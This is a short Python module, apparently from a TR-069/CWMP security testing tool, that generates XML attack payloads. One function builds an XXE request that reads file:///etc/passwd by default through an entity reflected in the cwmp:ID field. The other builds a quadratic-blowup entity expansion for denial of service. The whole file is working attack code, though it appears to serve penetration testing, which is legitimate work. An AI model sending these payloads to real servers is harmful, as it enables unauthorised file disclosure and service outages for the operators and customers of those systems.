from .data import soap
from .data.rpcs import rpc_methods


def xxe(file: str = "file:///etc/passwd", xml: str = None):
    """
    Test for XML External Entity (XXE) Processing by using a reference in cwmp:ID, which is reflected by the
    server in its response. If no request xml is given, a GetRPCMethods RPC will be used.
    """
    if xml is None:
        xml = rpc_methods.make_get_rpc_methods()
    return (
        f'<?xml version="1.0"?><!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM "{file}"> ]>'
        f'{soap.set_cwmp_id(xml, "&xxe;")}'
    )


def quadratic_blowup(repetitions=1_000, entity_size=100_000):
    """
    Quadratic Blowup DoS.
    """
    return f"""
<!DOCTYPE bomb [
    <!ENTITY a "{'B'* entity_size}">
]>
<bomb>{'&a;' * repetitions}</bomb>
""".strip()
